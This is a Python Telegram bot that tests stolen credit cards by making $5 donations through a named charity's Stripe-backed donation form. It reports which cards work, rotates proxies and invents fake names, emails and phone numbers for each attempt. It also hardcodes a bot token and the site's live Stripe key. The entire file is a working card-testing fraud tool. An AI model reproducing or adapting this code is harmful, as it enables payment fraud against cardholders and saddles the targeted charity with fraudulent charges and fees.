import requests as rq
import pyzstd
import re
import time
import telebot
import random
import names
from bs4 import BeautifulSoup

TOKEN = '7769031030:AAGreeowh7Z62pkpm1KIyRHe7_qjWHNkFHw'
bot = telebot.TeleBot(TOKEN)
user_id = None
admin = '1519654469'
coop = ''

# Generador de identidad aleatoria
def generar_identidad():
    nombre = names.get_first_name()
    apellido = names.get_last_name()
    email = f"{nombre.lower()}.{apellido.lower()}{random.randint(1, 999)}@gmail.com"
    telefono = f"305{random.randint(1000000, 9999999)}"
    return nombre, apellido, email, telefono

# Función para cargar proxies desde el archivo enviado por el usuario
def cargar_proxies(archivo):
    with open(archivo, 'r') as f:
        proxies = f.readlines()
    return [proxy.strip() for proxy in proxies]

# Función para mostrar la barra de progreso
def actualizar_progreso(index, total, mensaje_adicional=""):
    progreso = int((index / total) * 100)
    barra = '█' * (progreso // 2) + '-' * (50 - progreso // 2)  # 50 caracteres en la barra
    mensaje = f"🔄 Verificando tarjeta {index + 1}/{total}:\n[{barra}] {progreso}% {mensaje_adicional}"
    bot.send_message(user_id, mensaje)

# Función principal de verificación de tarjetas
def chk(card_list, proxies):
    s = rq.Session()
    UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    current_proxy = 0
    proxy_fails = 0  # Contador para ver cuántos proxies han fallado

    total_cards = len(card_list)
    bot.send_message(user_id, f"✅ Iniciando la verificación de {total_cards} tarjetas.")

    for index, card in enumerate(card_list):
        # Obtener tarjeta actual
        ccn, mm, yyyy, cvv = card.split('|')

        while proxy_fails < len(proxies):
            # Rotar proxy
            proxy = proxies[current_proxy]
            current_proxy = (current_proxy + 1) % len(proxies)
            s.proxies = {
                'http': proxy,
                'https': proxy
            }

            # Generar identidad aleatoria
            nombre, apellido, email, telefono = generar_identidad()

            # Iniciar solicitud para cada tarjeta
            try:
                req = s.get('https://fundacioncarf.org/en/donar/', headers={'User-Agent': UA})

                if req.status_code == 200:
                    soup = BeautifulSoup(req.text, 'html.parser')
                    form_id = soup.find('input', {'name': 'give-form-id'})['value']
                    form_id_prefix = soup.find('input', {'name': 'give-form-id-prefix'})['value']
                    form_hash = soup.find('input', {'name': 'give-form-hash'})['value']
                    form_Id = soup.find('input', {'id': 'give-campaign_name-184309-8'})['value']

                time.sleep(2)
                Payment_method = s.post('https://m.stripe.com/6', headers={'User-Agent': UA})
                pm_json = Payment_method.json()
                Guid = pm_json['guid']
                Muid = pm_json['muid']
                Sid = pm_json['sid']

                payload = {
                    'type': 'card',
                    'billing_details[name]': f'{nombre} {apellido}',
                    'billing_details[email]': email,
                    'card[number]': ccn,
                    'card[cvc]': cvv,
                    'card[exp_month]': mm,
                    'card[exp_year]': yyyy,
                    'guid': Guid,
                    'muid': Muid,
                    'sid': Sid,
                    'referrer': 'https://fundacioncarf.org',
                    'key': 'pk_live_51ExU9fDt6O239osOirwkh3ALddM8NJFRrzf1F9ivKBYgUykWwdSkDyu69EuXCVSUVnopFljv9UjpToPJZESIRv1G00HLNSplMg',
                    '_stripe_account': 'acct_1ExU9fDt6O239osO'
                }

                payment_headers = {
                    "accept": "application/json",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "es-ES,es;q=0.9",
                    "content-type": "application/x-www-form-urlencoded",
                    "user-agent": UA
                }

                time.sleep(3)
                payment = s.post('https://api.stripe.com/v1/payment_methods', data=payload, headers=payment_headers)
                payment_json = payment.json()
                Id = payment_json['id']

                p_process_payload = {
                    "give-form-id-prefix": form_id_prefix,
                    "give-form-id": form_id,
                    "give-form-title": "Dona online",
                    "give-current-url": "https://fundacioncarf.org/en/donar/",
                    "give-amount": "5.00",
                    "give_stripe_payment_method": Id,
                    "payment-mode": "stripe",
                    "give_first": nombre,
                    "give_last": apellido,
                    "give_email": email,
                    "telefono": telefono,
                    "give_action": "purchase"
                }

                p_process_head = {
                    "accept": "text/html,application/xhtml+xml",
                    "content-type": "application/x-www-form-urlencoded",
                    "user-agent": UA
                }

                time.sleep(1)
                p_process = s.post('https://fundacioncarf.org/en/donar/', data=p_process_payload, headers=p_process_head, allow_redirects=True)

                # Actualiza la barra de progreso
                actualizar_progreso(index, total_cards)

                if p_process.status_code == 200:
                    url_final = p_process.url
                    if 'donacion-gracias' in url_final:
                        bot.send_message(user_id, f"🎉 Donación exitosa con la tarjeta **{ccn}**.")
                    elif '3d_secure' in url_final:
                        bot.send_message(user_id, f"⚠️ La tarjeta **{ccn}** requiere verificación 3D Secure.")
                    else:
                        bot.send_message(user_id, f"❌ Error con la tarjeta **{ccn}**.")
                else:
                    bot.send_message(user_id, f"⚠️ La tarjeta **{ccn}** falló con el código de estado {p_process.status_code}.")

                break  # Si el proxy funciona, sal del ciclo de rotación

            except Exception as e:
                proxy_fails += 1
                if proxy_fails == len(proxies):
                    bot.send_message(user_id, "🚫 Todos los proxies fallaron. Por favor, envía una nueva lista de proxies.")
                else:
                    bot.send_message(user_id, f"⚠️ Hubieron un total de {len(proxies)} proxies fallidos, se recomienda cambiar la lista de proxies si este valor excede más de la mitad de sus proxies.")
                return

@bot.message_handler(commands=['start'])
def iniciar(message):
    global user_id
    bot.reply_to(message, "👋 ¡Hola! Raydiel.")
    user_id = str(message.from_user.id)

    if user_id in admin or user_id in coop:
        # Recepción del archivo de proxies
        @bot.message_handler(content_types=['document'])
        def handle_proxies_file(message):
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open('proxies.txt', 'wb') as f:
                f.write(downloaded_file)
            bot.reply_to(message, "✅ Archivo de proxies guardado correctamente.")

        # Comando para verificar tarjetas
        @bot.message_handler(commands=['chk'])
        def handle_chk(message):
            card_list = message.text.split()[1:]  # Tarjetas enviadas
            proxies = cargar_proxies('proxies.txt')  # Cargar proxies del archivo
            chk(card_list, proxies)
    else:
        bot.send_message(user_id, "🚫 No tienes permiso para usar este bot.")
        bot.send_message(user_id, f"🔒 Tu usuario es: {user_id} no coincide con mi base de datos. Te jodiste papasito")

if __name__ == "__main__":
    # Iniciar el bot
    bot.polling()
